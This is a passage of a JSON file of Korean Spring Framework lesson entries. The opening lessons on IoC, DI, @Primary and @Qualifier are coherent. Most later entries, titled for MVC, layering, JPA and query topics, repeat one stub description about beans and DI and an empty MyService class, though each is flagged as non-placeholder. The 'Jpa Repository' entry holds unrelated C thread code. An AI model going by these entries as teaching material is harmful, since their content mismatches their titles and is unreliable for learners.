        "code": "// ❌ IoC 없이 (개발자가 직접 관리)\npublic class Application {\n    public static void main(String[] args) {\n        UserRepository repo = new UserRepository();\n        UserService service = new UserService(repo);  // 직접 생성\n        UserController controller = new UserController(service);\n    }\n}\n\n// ✅ IoC 적용 (스프링이 관리)\n@SpringBootApplication\npublic class Application {\n    public static void main(String[] args) {\n        // 스프링 컨테이너가 모든 빈 생성/관리\n        ApplicationContext ctx = SpringApplication.run(Application.class, args);\n        \n        // 필요할 때 꺼내서 사용\n        UserService service = ctx.getBean(UserService.class);\n    }\n}"
      },
      {
        "type": "tip",
        "title": "IoC의 장점",
        "content": "1. 객체 생명주기를 프레임워크가 관리\\n2. 개발자는 비즈니스 로직에 집중\\n3. 결합도 감소, 유연성 증가\\n4. 테스트 용이"
      }
    ]
  },
  "02_핵심개념/practice-di": {
    "id": "02_핵심개념/practice-di",
    "title": "DI 실습 예제",
    "category": "spring",
    "subCategory": "02_핵심개념",
    "language": "Java",
    "description": "실제 프로젝트에서 DI를 적용하는 실습을 진행합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "실습 목표",
        "content": "회원 서비스를 만들면서 인터페이스와 구현체를 분리하고, DI를 적용하는 방법을 실습합니다. 이를 통해 구현체를 쉽게 교체할 수 있는 유연한 구조를 만듭니다."
      },
      {
        "type": "code",
        "language": "Java",
        "title": "DI 실습 코드",
        "code": "// 1. 인터페이스 정의\npublic interface MemberRepository {\n    void save(Member member);\n    Member findById(Long id);\n}\n\n// 2. 구현체 (메모리 저장소)\n@Repository\npublic class MemoryMemberRepository implements MemberRepository {\n    private final Map<Long, Member> store = new HashMap<>();\n    \n    @Override\n    public void save(Member member) {\n        store.put(member.getId(), member);\n    }\n    \n    @Override\n    public Member findById(Long id) {\n        return store.get(id);\n    }\n}\n\n// 3. 서비스 (DI 적용)\n@Service\n@RequiredArgsConstructor\npublic class MemberService {\n    private final MemberRepository memberRepository;  // 인터페이스에 의존\n    \n    public void join(Member member) {\n        memberRepository.save(member);\n    }\n}"
      },
      {
        "type": "tip",
        "title": "실습 포인트",
        "content": "1. 인터페이스에 의존하면 구현체 교체가 쉬움\\n2. 나중에 JpaMemberRepository로 변경해도 서비스 코드 수정 불필요\\n3. 테스트 시 MockMemberRepository 주입 가능"
      }
    ]
  },
  "02_핵심개념/primary": {
    "id": "02_핵심개념/primary",
    "title": "@Primary 어노테이션",
    "category": "spring",
    "subCategory": "02_핵심개념",
    "language": "Java",
    "description": "@Primary로 우선순위 빈을 지정하는 방법을 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "@Primary란?",
        "content": "같은 타입의 빈이 여러 개일 때, @Primary가 붙은 빈이 우선적으로 주입됩니다. 기본값을 정할 때 유용하며, @Qualifier보다 우선순위가 낮습니다."
      },
      {
        "type": "code",
        "language": "Java",
        "title": "@Primary 사용 예제",
        "code": "// 인터페이스\npublic interface PaymentService {\n    void pay(int amount);\n}\n\n// 기본 구현체 (우선)\n@Service\n@Primary  // 기본으로 주입될 빈\npublic class KakaoPayService implements PaymentService {\n    @Override\n    public void pay(int amount) {\n        System.out.println(\"카카오페이: \" + amount);\n    }\n}\n\n// 대체 구현체\n@Service\npublic class NaverPayService implements PaymentService {\n    @Override\n    public void pay(int amount) {\n        System.out.println(\"네이버페이: \" + amount);\n    }\n}\n\n// 사용 - KakaoPayService가 주입됨\n@Service\npublic class OrderService {\n    private final PaymentService paymentService;  // KakaoPayService\n}"
      },
      {
        "type": "tip",
        "title": "핵심 포인트",
        "content": "1. @Primary는 기본값 설정에 사용\\n2. @Qualifier가 @Primary보다 우선순위 높음\\n3. 한 타입에 하나의 @Primary만 권장"
      }
    ]
  },
  "02_핵심개념/qualifier": {
    "id": "02_핵심개념/qualifier",
    "title": "@Qualifier 어노테이션",
    "category": "spring",
    "subCategory": "02_핵심개념",
    "language": "Java",
    "description": "@Qualifier로 특정 빈을 지정하여 주입하는 방법을 학습합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "@Qualifier란?",
        "content": "같은 타입의 빈이 여러 개일 때, @Qualifier로 정확히 어떤 빈을 주입받을지 지정합니다. 빈 이름을 명시적으로 지정하므로 @Primary보다 우선순위가 높습니다."
      },
      {
        "type": "code",
        "language": "Java",
        "title": "@Qualifier 사용 예제",
        "code": "// 빈 등록 시 이름 지정\n@Service\n@Qualifier(\"kakaoPay\")\npublic class KakaoPayService implements PaymentService { }\n\n@Service\n@Qualifier(\"naverPay\")\npublic class NaverPayService implements PaymentService { }\n\n// 주입 시 명시적 지정\n@Service\npublic class OrderService {\n    private final PaymentService paymentService;\n    \n    public OrderService(\n            @Qualifier(\"naverPay\") PaymentService paymentService) {\n        this.paymentService = paymentService;  // NaverPayService 주입\n    }\n}\n\n// 여러 개 주입 시\n@Service\npublic class PaymentManager {\n    private final PaymentService kakao;\n    private final PaymentService naver;\n    \n    public PaymentManager(\n            @Qualifier(\"kakaoPay\") PaymentService kakao,\n            @Qualifier(\"naverPay\") PaymentService naver) {\n        this.kakao = kakao;\n        this.naver = naver;\n    }\n}"
      },
      {
        "type": "tip",
        "title": "핵심 포인트",
        "content": "1. @Qualifier > @Primary 우선순위\\n2. 문자열 매칭이라 오타 주의\\n3. 커스텀 Qualifier 어노테이션 권장\\n4. 컴파일 타임 검증 안됨"
      }
    ]
  },
  "02_핵심개념/quiz-core": {
    "id": "02_핵심개념/quiz-core",
    "title": "Spring 핵심개념 퀴즈",
    "category": "spring",
    "subCategory": "02_핵심개념",
    "language": "Java",
    "description": "Spring 핵심 개념을 점검하는 퀴즈입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "핵심개념 퀴즈",
        "content": "Q1. 스프링 빈의 기본 스코프는? → singleton\\n\\nQ2. @Autowired를 생략할 수 있는 조건은? → 생성자가 1개일 때\\n\\nQ3. @Primary vs @Qualifier 우선순위? → @Qualifier가 높음\\n\\nQ4. 생성자 주입을 권장하는 이유 3가지? → 불변성, 순환참조 방지, 테스트 용이"
      },
      {
        "type": "code",
        "language": "Java",
        "title": "코드 퀴즈",
        "code": "// Q: 아래 코드에서 주입되는 빈은?\n@Service\n@Primary\npublic class ServiceA implements MyService { }\n\n@Service\n@Qualifier(\"special\")\npublic class ServiceB implements MyService { }\n\n@Component\npublic class Client {\n    @Autowired\n    @Qualifier(\"special\")\n    private MyService service;  // A: ServiceB\n}\n\n// Q: 순환 참조가 발생하는 코드는?\n// A: A -> B -> A 또는 A -> A (자기 참조)"
      },
      {
        "type": "tip",
        "title": "복습 포인트",
        "content": "1. IoC: 제어 역전, 컨테이너가 관리\\n2. DI: 의존성 주입, IoC 구현 방법\\n3. Bean: 스프링이 관리하는 객체\\n4. 생성자 주입 필수 암기!"
      }
    ]
  },
  "03_웹MVC/controller-basic": {
    "id": "03_웹MVC/controller-basic",
    "title": "Controller Basic",
    "category": "spring",
    "subCategory": "03_웹MVC",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Controller Basic",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "03_웹MVC/controlleradvice": {
    "id": "03_웹MVC/controlleradvice",
    "title": "Controlleradvice",
    "category": "spring",
    "subCategory": "03_웹MVC",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Controlleradvice",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "03_웹MVC/dispatcher-servlet": {
    "id": "03_웹MVC/dispatcher-servlet",
    "title": "Dispatcher Servlet",
    "category": "spring",
    "subCategory": "03_웹MVC",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Dispatcher Servlet",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "03_웹MVC/exception-handler": {
    "id": "03_웹MVC/exception-handler",
    "title": "Exception Handler",
    "category": "spring",
    "subCategory": "03_웹MVC",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Exception Handler",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "03_웹MVC/interceptor": {
    "id": "03_웹MVC/interceptor",
    "title": "Interceptor",
    "category": "spring",
    "subCategory": "03_웹MVC",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Interceptor",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "03_웹MVC/mvc-pattern": {
    "id": "03_웹MVC/mvc-pattern",
    "title": "Mvc Pattern",
    "category": "spring",
    "subCategory": "03_웹MVC",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Mvc Pattern",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "03_웹MVC/path-variable": {
    "id": "03_웹MVC/path-variable",
    "title": "Path Variable",
    "category": "spring",
    "subCategory": "03_웹MVC",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Path Variable",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "03_웹MVC/practice-mvc": {
    "id": "03_웹MVC/practice-mvc",
    "title": "Practice Mvc",
    "category": "spring",
    "subCategory": "03_웹MVC",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Practice Mvc",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "03_웹MVC/quiz-mvc": {
    "id": "03_웹MVC/quiz-mvc",
    "title": "Quiz Mvc",
    "category": "spring",
    "subCategory": "03_웹MVC",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Quiz Mvc",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "03_웹MVC/request-body": {
    "id": "03_웹MVC/request-body",
    "title": "Request Body",
    "category": "spring",
    "subCategory": "03_웹MVC",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Request Body",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "03_웹MVC/request-mapping": {
    "id": "03_웹MVC/request-mapping",
    "title": "Request Mapping",
    "category": "spring",
    "subCategory": "03_웹MVC",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Request Mapping",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "03_웹MVC/request-param": {
    "id": "03_웹MVC/request-param",
    "title": "Request Param",
    "category": "spring",
    "subCategory": "03_웹MVC",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Request Param",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "03_웹MVC/response-entity": {
    "id": "03_웹MVC/response-entity",
    "title": "Response Entity",
    "category": "spring",
    "subCategory": "03_웹MVC",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Response Entity",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "03_웹MVC/rest-controller": {
    "id": "03_웹MVC/rest-controller",
    "title": "Rest Controller",
    "category": "spring",
    "subCategory": "03_웹MVC",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Rest Controller",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "03_웹MVC/validation": {
    "id": "03_웹MVC/validation",
    "title": "Validation",
    "category": "spring",
    "subCategory": "03_웹MVC",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Validation",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "04_계층구조/dto-pattern": {
    "id": "04_계층구조/dto-pattern",
    "title": "Dto Pattern",
    "category": "spring",
    "subCategory": "04_계층구조",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Dto Pattern",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "04_계층구조/layered-architecture": {
    "id": "04_계층구조/layered-architecture",
    "title": "Layered Architecture",
    "category": "spring",
    "subCategory": "04_계층구조",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Layered Architecture",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "04_계층구조/mapper": {
    "id": "04_계층구조/mapper",
    "title": "Mapper",
    "category": "spring",
    "subCategory": "04_계층구조",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Mapper",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "04_계층구조/practice-layer": {
    "id": "04_계층구조/practice-layer",
    "title": "Practice Layer",
    "category": "spring",
    "subCategory": "04_계층구조",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Practice Layer",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "04_계층구조/quiz-layer": {
    "id": "04_계층구조/quiz-layer",
    "title": "Quiz Layer",
    "category": "spring",
    "subCategory": "04_계층구조",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Quiz Layer",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "04_계층구조/service-layer": {
    "id": "04_계층구조/service-layer",
    "title": "Service Layer",
    "category": "spring",
    "subCategory": "04_계층구조",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Service Layer",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "05_JPA기초/dirty-checking": {
    "id": "05_JPA기초/dirty-checking",
    "title": "Dirty Checking",
    "category": "spring",
    "subCategory": "05_JPA기초",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Dirty Checking",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "05_JPA기초/entity-annotations": {
    "id": "05_JPA기초/entity-annotations",
    "title": "Entity Annotations",
    "category": "spring",
    "subCategory": "05_JPA기초",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Entity Annotations",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "05_JPA기초/entity-basic": {
    "id": "05_JPA기초/entity-basic",
    "title": "Entity Basic",
    "category": "spring",
    "subCategory": "05_JPA기초",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Entity Basic",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "05_JPA기초/jpa-intro": {
    "id": "05_JPA기초/jpa-intro",
    "title": "Jpa Intro",
    "category": "spring",
    "subCategory": "05_JPA기초",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Jpa Intro",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "05_JPA기초/jpa-repository": {
    "id": "05_JPA기초/jpa-repository",
    "title": "Jpa Repository",
    "category": "spring",
    "subCategory": "05_JPA기초",
    "language": "C",
    "description": "프로세스 메모리 구조와 스레드 간의 컨텍스트 스위칭 원리를 파악합니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Jpa Repository",
        "content": "프로세스 메모리 구조와 스레드 간의 컨텍스트 스위칭 원리를 파악합니다."
      },
      {
        "type": "code",
        "language": "C",
        "code": "#include <pthread.h>\r\n\r\nvoid* thread_func(void* arg) {\r\n    printf(\"Thread Running\\n\");\r\n    return NULL;\r\n}\r\n\r\nint main() {\r\n    pthread_t thread;\r\n    pthread_create(&thread, NULL, thread_func, NULL);\r\n    pthread_join(thread, NULL);\r\n    return 0;\r\n}"
      }
    ]
  },
  "05_JPA기초/jpql": {
    "id": "05_JPA기초/jpql",
    "title": "Jpql",
    "category": "spring",
    "subCategory": "05_JPA기초",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Jpql",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "05_JPA기초/persistence-context": {
    "id": "05_JPA기초/persistence-context",
    "title": "Persistence Context",
    "category": "spring",
    "subCategory": "05_JPA기초",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Persistence Context",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "05_JPA기초/practice-jpa-crud": {
    "id": "05_JPA기초/practice-jpa-crud",
    "title": "Practice Jpa Crud",
    "category": "spring",
    "subCategory": "05_JPA기초",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Practice Jpa Crud",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "05_JPA기초/query-method": {
    "id": "05_JPA기초/query-method",
    "title": "Query Method",
    "category": "spring",
    "subCategory": "05_JPA기초",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Query Method",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "05_JPA기초/quiz-jpa-basic": {
    "id": "05_JPA기초/quiz-jpa-basic",
    "title": "Quiz Jpa Basic",
    "category": "spring",
    "subCategory": "05_JPA기초",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Quiz Jpa Basic",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "06_JPA연관관계/cascade": {
    "id": "06_JPA연관관계/cascade",
    "title": "Cascade",
    "category": "spring",
    "subCategory": "06_JPA연관관계",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Cascade",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "06_JPA연관관계/fetch-type": {
    "id": "06_JPA연관관계/fetch-type",
    "title": "Fetch Type",
    "category": "spring",
    "subCategory": "06_JPA연관관계",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Fetch Type",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "06_JPA연관관계/interview-jpa-relation": {
    "id": "06_JPA연관관계/interview-jpa-relation",
    "title": "Interview Jpa Relation",
    "category": "spring",
    "subCategory": "06_JPA연관관계",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Interview Jpa Relation",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "06_JPA연관관계/many-to-many": {
    "id": "06_JPA연관관계/many-to-many",
    "title": "Many To Many",
    "category": "spring",
    "subCategory": "06_JPA연관관계",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Many To Many",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "06_JPA연관관계/many-to-one": {
    "id": "06_JPA연관관계/many-to-one",
    "title": "Many To One",
    "category": "spring",
    "subCategory": "06_JPA연관관계",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Many To One",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "06_JPA연관관계/one-to-many": {
    "id": "06_JPA연관관계/one-to-many",
    "title": "One To Many",
    "category": "spring",
    "subCategory": "06_JPA연관관계",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "One To Many",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "06_JPA연관관계/practice-relation": {
    "id": "06_JPA연관관계/practice-relation",
    "title": "Practice Relation",
    "category": "spring",
    "subCategory": "06_JPA연관관계",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Practice Relation",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "06_JPA연관관계/relation-intro": {
    "id": "06_JPA연관관계/relation-intro",
    "title": "Relation Intro",
    "category": "spring",
    "subCategory": "06_JPA연관관계",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Relation Intro",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "07_JPA심화/auditing": {
    "id": "07_JPA심화/auditing",
    "title": "Auditing",
    "category": "spring",
    "subCategory": "07_JPA심화",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Auditing",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "07_JPA심화/batch-size": {
    "id": "07_JPA심화/batch-size",
    "title": "Batch Size",
    "category": "spring",
    "subCategory": "07_JPA심화",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Batch Size",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "07_JPA심화/entity-graph": {
    "id": "07_JPA심화/entity-graph",
    "title": "Entity Graph",
    "category": "spring",
    "subCategory": "07_JPA심화",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Entity Graph",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "07_JPA심화/fetch-join": {
    "id": "07_JPA심화/fetch-join",
    "title": "Fetch Join",
    "category": "spring",
    "subCategory": "07_JPA심화",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Fetch Join",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "07_JPA심화/interview-jpa-advanced": {
    "id": "07_JPA심화/interview-jpa-advanced",
    "title": "Interview Jpa Advanced",
    "category": "spring",
    "subCategory": "07_JPA심화",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Interview Jpa Advanced",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "07_JPA심화/n-plus-one": {
    "id": "07_JPA심화/n-plus-one",
    "title": "N Plus One",
    "category": "spring",
    "subCategory": "07_JPA심화",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "N Plus One",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "07_JPA심화/practice-jpa-advanced": {
    "id": "07_JPA심화/practice-jpa-advanced",
    "title": "Practice Jpa Advanced",
    "category": "spring",
    "subCategory": "07_JPA심화",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Practice Jpa Advanced",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "07_JPA심화/querydsl-advanced": {
    "id": "07_JPA심화/querydsl-advanced",
    "title": "Querydsl Advanced",
    "category": "spring",
    "subCategory": "07_JPA심화",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Querydsl Advanced",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "07_JPA심화/querydsl-intro": {
    "id": "07_JPA심화/querydsl-intro",
    "title": "Querydsl Intro",
    "category": "spring",
    "subCategory": "07_JPA심화",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Querydsl Intro",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "08_트랜잭션/interview-transaction": {
    "id": "08_트랜잭션/interview-transaction",
    "title": "Interview Transaction",
    "category": "spring",
